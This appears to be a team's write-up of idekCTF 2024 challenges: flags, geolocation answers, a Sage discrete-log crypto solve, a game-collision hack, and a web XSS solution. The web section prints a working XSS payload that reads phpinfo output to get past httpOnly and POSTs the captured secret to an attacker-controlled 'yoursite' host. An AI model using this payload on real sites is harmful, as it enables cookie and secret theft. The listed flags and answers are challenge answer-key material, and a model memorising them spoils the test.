# idekCTF 2024
###### tags: `CTF`

Player: 
- ywc
- Pierre
- Amias
- MuMu

## sanity
### Welcome to idekCTF 2024!

```
Welcome to idekCTF 2024! Please join our discord for any announcements and updates on challenges.
```

![image](https://i.imgur.com/iZDy4E7.png)

`idek{our_hack_fortress_team_is_looking_for_mvm_players}`

### Feedback survey

```
Thank you for participating in idekCTF, please let us know how we did!

Survey
```

![image](https://i.imgur.com/m5WHwnS.png)

`idek{next_year_will_be_idek_2025...We_promise!}`

## misc
### NM~~PZ~~ - easy
```
Just a few completely random locations.

http://nmpz.chal.idek.team:1337

Downloads

nmpz1.tar.gz
```

- [bonaparte_1784](https://maps.app.goo.gl/9HTb3ouVMgvNqgQo9)
    - 1,1e3f2a0309b777b37b1bc12d01203339
- [beer_park](https://maps.app.goo.gl/nkLdGRRLeFLneCzs9)
    - 2,ec72b5bdb83f858308142a0d3dde5714
- [mr_drains](https://maps.app.goo.gl/1jDJoLCCKZhKeyzw5)
    - 3,c82846bd8de1579487c290fe0ef30700
- [green_car](https://maps.app.goo.gl/GEGjaKAqruoQv3iE9)
    - 4,399a088ff464a1a43ed3d6864c7f50b5
- [posuto_py](https://maps.app.goo.gl/v1NatG3u6Qawq8tw5)
    - 5,fc26a083d35cb9d6b474580017f8bdfa
- [icc](https://maps.app.goo.gl/R1xvFKtXQbgooif2A)
    - 6,836c35892e7643f71668376d1716e44e
- [imax](https://maps.app.goo.gl/qjb1tgDidEXP9Sad7)
    - 7,aef9cc02ac17e0a806c2204fceea74f1
- [panasonic](https://maps.app.goo.gl/qxJx7SRANfkYDJTV8)
    - 9,a1e3b275a3e73cd964ffd840063204be
- [deja_vu](https://maps.app.goo.gl/A2e5KGU2s1RyUXV3A)
    - 10,201189c04aae837ab90f86c9d5747beb

![image](https://i.imgur.com/ImHycCW.png)

```
idek{very_iconic_tower_75029e39}
```

### NM~~PZ~~ - medium

- [soylent_green](https://maps.app.goo.gl/kPxN7zeV7pmA6R2Q6)
    - 1,1755e5bcb85dc2786de932d826419f56
- [and_my_compass](https://maps.app.goo.gl/MNNgeL2k8PfaJjJB9)
    - 2,0e8368ee81b0cadffa2d0199b17be81f
- [sea_adventure](https://maps.app.goo.gl/pg7K5tuVdpQKoS4z5)
    - 3,5dd302f03e495b7a888a4b66686ccec0
- [beach_property](https://maps.app.goo.gl/N9fF8G22nYj9Yprr7)
    - 4,227b1b59720a42a04f2cff396f5a41a6
- [stair_way_to_heaven](https://maps.app.goo.gl/oWhJpYk9w33Dm4786)
    - 5,bcc9a94dd9b9026121dd4a7b5d106a87
- [a_circle](https://maps.app.goo.gl/TpdMZ22KPzdnBBwG6)
    - 6,b047238f02c1753e02473be44696319b- 

## crypto
### Golden Ticket
```
Can you help Charles - who doesn't have any knowledge about cryptography, get the golden ticket and have a trip to Willy Wonka's factory ?

Downloads

goldenticket.tar.gz
```

題目給了我們 $p$, $13^x+37^x \mod p$, $13^{x-1}+37^{x-1} \mod p$ 要求 $x$

$a = 13$

$b = 37$

$A = a^x + b^x$

$a^x = A - b^x$

$B = a^{x-1} + b^{x-1} = \frac{a^x}{a}+\frac{b^x}{b}$

$a*b*B = b*a^x + a*b^x = b*(A - b^x) + a*b^x = b*A + (a-b)*b^x$

$b^x = \frac{a*b*B - b*A}{a-b}$

而 p-1 平滑，因此可以用 Pohlig–Hellman 來解 (i.e. sagemath discrete_log)

```python
# solve.py
p = xxx
A = xxx
B = xxx
a = 13
b = 37

from sage.all import *

R = Zmod(p)
a = R(a)
b = R(b)
A = R(A)
B = R(B)

f = (a*b*B - b*A) / (a - b)
x = discrete_log(f, b)
print(x)

from Crypto.Util.number import long_to_bytes
print(long_to_bytes(x))
```

![image](https://i.imgur.com/F2ujmXK.png)

`idek{charles_and_the_chocolate_factory!!!}`

## Web
### Hello

```
Just to warm you up for the next Fight :"D

http://idek-hello.chal.idek.team:1337

Admin Bot Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL
```

bot有設 `httpOnly: true`
可以直接訪問 http://idek-hello.chal.idek.team:1337/info.php/index.php
[Ref1](https://aleksikistauri.medium.com/bypassing-httponly-with-phpinfo-file-4e5a8b17129b)

不能使用空白比較麻煩可以替換成`•`
Payload: `http://idek-hello.chal.idek.team:1337/?name=%3CBODY%0cONLOAD=%22fetch(%27info.php\\index.php%27).then(r=%3Er.text()).then(t=%3Efetch(%27https://yoursite%27,{method:%27POST%27,body:t.match(RegExp(%27FLAG=([^%3C]*)%27))[1]}))%22%3E`
[Ref2](https://security.stackexchange.com/questions/47684/what-is-a-good-xss-vector-without-forward-slashes-and-spaces)

`idek{Ghazy_N3gm_Elbalad}`

## Reverse
### Game

There is a json file named spritesheet, that defined the collision or icon position. 
So we just need to modify collsion to all zero and use CheatEngine speedhack to speed up.

```json
},
    "obstacle_small_0": {
        "x": 228,
        "y": 2,
        "width": 17,
        "height": 35,
        "collision": [
            {"x": 0, "y": 0, "width": 0, "height": 0}
        ]
    },
    "obstacle_small_1": {
        "x": 245,
        "y": 2,
        "width": 34,
        "height": 35,
        "collision": [
            {"x": 0, "y": 0, "width": 0, "height": 0},
            {"x": 0, "y": 0, "width": 0, "height": 0},
            {"x": 0, "y": 0, "width": 0, "height": 0}
        ]
    }
```

Note: Do not use too fast speedhack or it could lead to overgo flag checkpoint.

![image](https://i.imgur.com/AR4VMCh.png)